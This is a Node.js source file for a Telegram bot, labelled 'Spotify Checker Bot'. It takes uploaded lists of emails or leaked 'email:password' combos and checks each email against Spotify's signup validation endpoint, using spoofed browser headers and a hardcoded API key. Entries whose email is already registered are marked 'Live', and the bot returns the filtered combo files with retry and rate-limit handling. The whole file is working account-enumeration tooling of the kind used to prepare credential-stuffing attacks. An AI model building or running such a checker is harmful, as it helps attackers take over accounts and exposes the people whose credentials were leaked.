const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');

// ==============================================
// ⚙️ CONFIG — TWEAK THESE IF YOU SEE ERRORS
// ==============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_KEY = 'a1e486e2729f46d6bb368d6b2bcda326';

// 🚦 Stability settings — start conservative, adjust later
const CONCURRENCY = 2;        // Check 2 at a time — gentle & safe
const BATCH_DELAY = 300;      // 300ms pause between batches
const RETRY_DELAY_429 = 3000; // 3s wait when rate-limited
const MAX_RETRIES = 2;        // Retry transient errors twice

// Express health check for Render uptime ping
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('✅ Spotify Checker Bot — Online'));
app.listen(PORT, () => console.log(`🌐 Keepalive server on port ${PORT}`));

if (!BOT_TOKEN) {
  console.error('❌ ERROR: BOT_TOKEN environment variable is not set!');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 30000 });

const headers = {
  'authority': 'spclient.wg.spotify.com',
  'accept': '*/*',
  'content-type': 'application/json',
  'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
};

const clientInfo = {
  api_key: API_KEY,
  app_version: 'v2',
  capabilities: [1],
  installation_id: 'f3bb4c40-89f4-45b6-a3d6-0d22dd486182',
  platform: 'www',
};

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ==============================================
// 🔍 SINGLE EMAIL CHECK — Improved Logic
// ==============================================
async function checkEmail(email) {
  const jsonData = {
    fields: [{ field: 'FIELD_EMAIL', value: email.trim() }],
    client_info: clientInfo,
    tracking: { creation_point: 'https://open.spotify.com/artist/59YhsSefd7itecSNMp0Nv8' },
  };

  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    try {
      const res = await axios.post(
        'https://spclient.wg.spotify.com/signup/public/v2/account/validate',
        jsonData,
        {
          headers,
          timeout: 10000,
          validateStatus: (status) => status < 500 // Don't throw on 4xx responses
        }
      );

      const resJson = res.data;

      // ✅ Clear status logic
      if (resJson.error !== undefined) {
        const errorStr = String(resJson.error).toLowerCase();
        if (errorStr.includes('already_exists') || errorStr.includes('exists')) {
          return { status: 'VALID', item: email };
        }
        // Other error messages = treat as Unknown
        return { status: 'UNKNOWN', item: email, reason: resJson.error };
      }

      if (resJson.success === true) {
        return { status: 'DEAD', item: email };
      }

      // Any other response = Unknown
      return { status: 'UNKNOWN', item: email, reason: 'Unexpected response' };

    } catch (err) {
      // 🚦 Rate-limited
      if (err.response?.status === 429) {
        console.log(`⚠️  Rate limited on ${email} — attempt ${attempt + 1}/${MAX_RETRIES}, waiting ${RETRY_DELAY_429}ms`);
        await sleep(RETRY_DELAY_429);
        continue;
      }

      // 🔁 Retry on connection/timeout errors
      const retryCodes = ['ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND', 'ECONNABORTED', 'EAI_AGAIN'];
      if (retryCodes.includes(err.code) && attempt + 1 < MAX_RETRIES) {
        await sleep(1000);
        continue;
      }

      // ❌ Failed permanently
      return {
        status: 'ERROR',
        item: email,
        error: err.code || err.message.slice(0, 60)
      };
    }
  }

  return { status: 'ERROR', item: email, error: 'Max retries exceeded' };
}

// ==============================================
// 💾 RESULTS HELPERS
// ==============================================
function restoreFullItem(mode, items, email, resultItem) {
  if (mode === 'emails') return email;
  // Find original full combo line from email match
  const found = items.find(line => {
    const lineEmail = line.split(':')[0].trim();
    return lineEmail.toLowerCase() === email.toLowerCase();
  });
  return found || resultItem;
}

// ==============================================
// 📦 BATCH PROCESSING
// ==============================================
async function processBatch(items, mode, onProgress) {
  const valid = [], dead = [], unknown = [], errors = [];
  let checked = 0;

  for (let i = 0; i < items.length; i += CONCURRENCY) {
    const batch = items.slice(i, i + CONCURRENCY);

    const promises = batch.map(async (item) => {
      const email = mode === 'emails' ? item : item.split(':')[0].trim();
      return checkEmail(email);
    });

    const results = await Promise.all(promises);

    for (const r of results) {
      const fullItem = restoreFullItem(mode, items, r.item, r.item);

      if (r.status === 'VALID') valid.push(fullItem);
      else if (r.status === 'DEAD') dead.push(fullItem);
      else if (r.status === 'UNKNOWN') unknown.push(`${fullItem} — ${r.reason || 'Unknown'}`);
      else errors.push(`${fullItem} — ${r.error}`);
    }

    checked += batch.length;
    onProgress(checked, valid.length, dead.length, unknown.length, errors.length);

    // Pause between batches
    if (i + CONCURRENCY < items.length) {
      await sleep(BATCH_DELAY);
    }
  }

  return { valid, dead, unknown, errors };
}

// ==============================================
// 📂 USER MODE STORAGE
// ==============================================
const userMode = new Map();

// ==============================================
// 🤖 BOT COMMANDS
// ==============================================
bot.start((ctx) => {
  try {
    ctx.reply(
      `👋 Welcome to Spotify Checker Bot!\n\n📌 Choose a mode below:`,
      Markup.inlineKeyboard([
        [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
        [Markup.button.callback('🔐 Check Combos (email:pass)', 'mode_combo')]
      ])
    );
  } catch (e) { console.error('Start error:', e.message); }
});

bot.action('mode_emails', (ctx) => {
  userMode.set(ctx.chat.id, 'emails');
  ctx.answerCbQuery();
  ctx.reply(
    '📧 **Mode: Email Only**\n\nSend a .txt file with one email per line.',
    { parse_mode: 'Markdown' }
  );
});

bot.action('mode_combo', (ctx) => {
  userMode.set(ctx.chat.id, 'combo');
  ctx.answerCbQuery();
  ctx.reply(
    '🔐 **Mode: Combo Checker**\n\nSend a .txt file with `email:password` per line.',
    { parse_mode: 'Markdown' }
  );
});

bot.command('mode', (ctx) => {
  ctx.reply(
    '🔄 Switch checking mode:',
    Markup.inlineKeyboard([
      [Markup.button.callback('📧 Emails Only', 'mode_emails')],
      [Markup.button.callback('🔐 Combos', 'mode_combo')]
    ])
  );
});

bot.help((ctx) => {
  ctx.reply(
    `📖 **Spotify Checker Bot — Help**\n\n` +
    `• /mode — Switch between Emails or Combos mode\n` +
    `• Send .txt file — Start checking immediately\n\n` +
    `📊 Live counters: 🟢 Live | 🔴 Dead | 🟡 Unknown | 🔵 Errors\n` +
    `⚡ Settings: ${CONCURRENCY} parallel, ${BATCH_DELAY}ms batch delay`
  );
});

// ==============================================
// 📄 FILE UPLOAD & MAIN WORKFLOW
// ==============================================
bot.on('document', async (ctx) => {
  try {
    const file = ctx.message.document;

    if (!file.file_name.endsWith('.txt')) {
      return ctx.reply('⚠️ Please upload a **.txt** file only.', { parse_mode: 'Markdown' });
    }

    const mode = userMode.get(ctx.chat.id) || 'combo';
    const modeLabel = mode === 'emails' ? '📧 Email-Only Mode' : '🔐 Combo Mode';

    await ctx.reply(
      `📥 File received: **${file.file_name}**\n` +
      `${modeLabel}\n` +
      `⚡ Concurrency: ${CONCURRENCY} | Delay: ${BATCH_DELAY}ms\n` +
      `⏳ Downloading file...`,
      { parse_mode: 'Markdown' }
    );

    // Download & parse file
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await axios.get(fileLink.href, { responseType: 'text', timeout: 30000 });

    let items = [];
    if (mode === 'emails') {
      items = res.data.split('\n').map(l => l.trim()).filter(l => l);
    } else {
      items = res.data.split('\n').filter(line => {
        const t = line.trim();
        return t && t.includes('@') && t.includes(':');
      });
    }

    if (items.length === 0) {
      return ctx.reply('❌ No valid entries found. Check your mode and file format.');
    }

    const total = items.length;

    // Send initial progress message
    const progressMsg = await ctx.reply(
      `⏳ **Progress: 0/${total} (0%)**\n\n` +
      `🟢 **Live:** 0\n` +
      `🔴 **Dead:** 0\n` +
      `🟡 **Unknown:** 0\n` +
      `🔵 **Errors:** 0`,
      { parse_mode: 'Markdown' }
    );

    // Real-time progress updater
    const updateMessage = async (checked, v, d, u, e) => {
      const percent = Math.round((checked / total) * 100);
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          progressMsg.message_id,
          undefined,
          `⏳ **Progress: ${checked}/${total} (${percent}%)**\n\n` +
          `🟢 **Live:** ${v}\n` +
          `🔴 **Dead:** ${d}\n` +
          `🟡 **Unknown:** ${u}\n` +
          `🔵 **Errors:** ${e}`,
          { parse_mode: 'Markdown' }
        );
      } catch {}
    };

    // Run checker
    const results = await processBatch(items, mode, updateMessage);

    // Final summary
    const summary =
      `✅ **✅ CHECK COMPLETE ✅**\n\n` +
      `📊 **Total:** ${total}\n` +
      `🟢 **Live:** ${results.valid.length}\n` +
      `🔴 **Dead:** ${results.dead.length}\n` +
      `🟡 **Unknown:** ${results.unknown.length}\n` +
      `🔵 **Errors:** ${results.errors.length}\n\n` +
      `File: ${file.file_name}\n` +
      `Made by: @PKay`;

    await ctx.reply(summary, { parse_mode: 'Markdown' });

    // Save output files
    const outputPath = path.join(__dirname, 'outputs');
    if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath);

    fs.writeFileSync(path.join(outputPath, 'live.txt'), results.valid.join('\n'));
    fs.writeFileSync(path.join(outputPath, 'dead.txt'), results.dead.join('\n'));
    fs.writeFileSync(path.join(outputPath, 'unknown.txt'), results.unknown.join('\n'));
    fs.writeFileSync(path.join(outputPath, 'results.txt'),
      `=== LIVE (${results.valid.length}) ===\n${results.valid.join('\n')}\n\n` +
      `=== DEAD (${results.dead.length}) ===\n${results.dead.join('\n')}\n\n` +
      `=== UNKNOWN (${results.unknown.length}) ===\n${results.unknown.join('\n')}\n\n` +
      `=== ERRORS (${results.errors.length}) ===\n${results.errors.join('\n')}`
    );

    // Send files
    await ctx.replyWithDocument(
      { source: path.join(outputPath, 'live.txt'), filename: 'live.txt' }
    );
    await ctx.replyWithDocument(
      { source: path.join(outputPath, 'dead.txt'), filename: 'dead.txt' }
    );
    await ctx.replyWithDocument(
      { source: path.join(outputPath, 'unknown.txt'), filename: 'unknown.txt' }
    );
    await ctx.replyWithDocument(
      { source: path.join(outputPath, 'results.txt'), filename: 'results.txt' }
    );

    await ctx.reply('📤 All files sent! ✅');

    // Cleanup
    fs.rmSync(outputPath, { recursive: true, force: true });

  } catch (err) {
    console.error('❌ Top-level error:', err.message);
    try {
      await ctx.reply(`⚠️ Error: ${err.message}`);
    } catch {}
  }
});

// ==============================================
// 🛡️ ERROR HANDLING
// ==============================================
bot.catch((err, ctx) => {
  console.error('❌ Bot error:', err.message, '| Update:', ctx.updateType);
});

// ==============================================
// 🚀 START BOT
// ==============================================
async function startBot() {
  try {
    console.log('🔄 Connecting to Telegram...');
    await bot.launch();
    console.log('✅ Bot is running — send /start in Telegram!');
    console.log(`⚡ Settings: Concurrency=${CONCURRENCY}, Delay=${BATCH_DELAY}ms, Retries=${MAX_RETRIES}`);
  } catch (err) {
    console.error('❌ Failed to start bot:', err.message);
    process.exit(1);
  }
}

startBot();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
